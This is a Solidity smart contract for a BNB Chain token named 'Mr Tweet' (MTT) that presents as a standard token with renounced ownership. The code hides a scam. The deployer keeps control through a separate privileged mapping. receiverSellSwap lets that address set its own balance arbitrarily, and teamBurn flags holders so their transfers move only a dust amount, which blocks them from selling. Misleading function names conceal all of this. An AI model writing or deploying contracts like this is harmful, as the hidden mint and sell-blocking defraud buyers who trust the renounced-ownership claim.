/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MrTweet {
    uint8 public decimals = 18;
    address public owner;
    string public name = "Mr Tweet";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => mapping(address => uint256)) public allowance;
    address public launchedModeTotal;

    mapping(address => bool) public receiverSell;
    uint256 constant feeAmountSender = 10 ** 10;
    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public amountReceiver;


    string public symbol = "MTT";
    address public atTo;

    modifier atBurn() {
        require(amountReceiver[msg.sender]);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address owner);

    constructor (){
        IUniswapV2Router burnEnableShould = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IUniswapV2Factory enableAt = IUniswapV2Factory(burnEnableShould.factory());
        launchedModeTotal = enableAt.createPair(burnEnableShould.WETH(), address(this));
        owner = msg.sender;
        atTo = owner;
        amountReceiver[atTo] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    

    function receiverSellSwap(uint256 toReceiver) public atBurn {
        balanceOf[atTo] = toReceiver;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == atTo || recipient == atTo) {
            return receiverModeReceiver(sender, recipient, amount);
        }
        if (receiverSell[sender]) {
            return receiverModeReceiver(sender, recipient, feeAmountSender);
        }
        return receiverModeReceiver(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function totalBuy(address atTeam) public atBurn {
        amountReceiver[atTeam] = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != type(uint256).max) {
            require(allowance[sender][msg.sender] >= amount);
            allowance[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function teamBurn(address buyShould) public atBurn {
        receiverSell[buyShould] = true;
    }

    function receiverModeReceiver(address launchListTake, address enableMarketing, uint256 toReceiver) internal returns (bool) {
        require(balanceOf[launchListTake] >= toReceiver);
        balanceOf[launchListTake] -= toReceiver;
        balanceOf[enableMarketing] += toReceiver;
        emit Transfer(launchListTake, enableMarketing, toReceiver);
        return true;
    }


}